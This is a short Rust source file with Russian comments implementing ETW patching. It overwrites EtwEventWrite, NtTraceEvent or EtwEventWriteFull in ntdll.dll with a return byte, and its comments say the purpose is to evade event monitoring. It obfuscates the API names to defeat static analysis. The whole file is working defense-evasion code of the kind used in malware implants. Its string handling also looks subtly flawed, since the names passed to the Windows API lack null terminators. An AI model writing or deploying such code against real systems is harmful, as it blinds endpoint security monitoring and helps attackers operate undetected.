use ntapi::ntmmapi::NtProtectVirtualMemory;
use ntapi::ntpsapi::NtCurrentProcess;
use std::ptr;
use obfstr::obfstr as s;

/// Патчинг ETW для обхода мониторинга событий
/// Поддерживает несколько методов патчинга для повышенной надежности
pub fn patch_etw() -> bool {
    // Попытка патчинга нескольких функций ETW для максимальной эффективности
    unsafe {
        // Патчинг EtwEventWrite (основной метод)
        if patch_etw_function(s!("ntdll.dll"), s!("EtwEventWrite"), &[0xC3]) {
            return true;
        }
        
        // Резервный метод: патчинг NtTraceEvent (более низкоуровневый)
        if patch_etw_function(s!("ntdll.dll"), s!("NtTraceEvent"), &[0xC3]) {
            return true;
        }
        
        // Дополнительный метод: патчинг EtwEventWriteFull
        patch_etw_function(s!("ntdll.dll"), s!("EtwEventWriteFull"), &[0xC3])
    }
}

/// Внутренняя функция для патчинга ETW функций
/// Использует обфускацию строк для защиты от статического анализа
unsafe fn patch_etw_function(dll_name: &str, function_name: &str, patch_bytes: &[u8]) -> bool {
    // Получение хэндла модуля с обфускацией строк
    let module = winapi::um::libloaderapi::GetModuleHandleA(
        dll_name.as_ptr() as *const i8
    );
    
    if module.is_null() {
        return false;
    }

    // Получение адреса функции с обфускацией имени
    let func_addr = winapi::um::libloaderapi::GetProcAddress(
        module, 
        function_name.as_ptr() as *const i8
    );
    
    if func_addr.is_null() {
        return false;
    }

    // Подготовка параметров для изменения защиты памяти
    let mut base = func_addr as *mut winapi::ctypes::c_void;
    let mut size: usize = patch_bytes.len();
    let mut old_protect: winapi::shared::ntdef::ULONG = 0;

    // Изменение защиты памяти для записи
    let status = NtProtectVirtualMemory(
        NtCurrentProcess,
        &mut base as *mut *mut winapi::ctypes::c_void,
        &mut size,
        0x40, // PAGE_EXECUTE_READWRITE
        &mut old_protect,
    );

    if status < 0 {
        return false;
    }

    // Запись патч-байтов
    for (i, &byte) in patch_bytes.iter().enumerate() {
        ptr::write((func_addr as usize + i) as *mut u8, byte);
    }

    // Восстановление оригинальной защиты памяти
    let _ = NtProtectVirtualMemory(
        NtCurrentProcess,
        &mut base as *mut *mut winapi::ctypes::c_void,
        &mut size,
        old_protect,
        &mut old_protect,
    );

    true
}
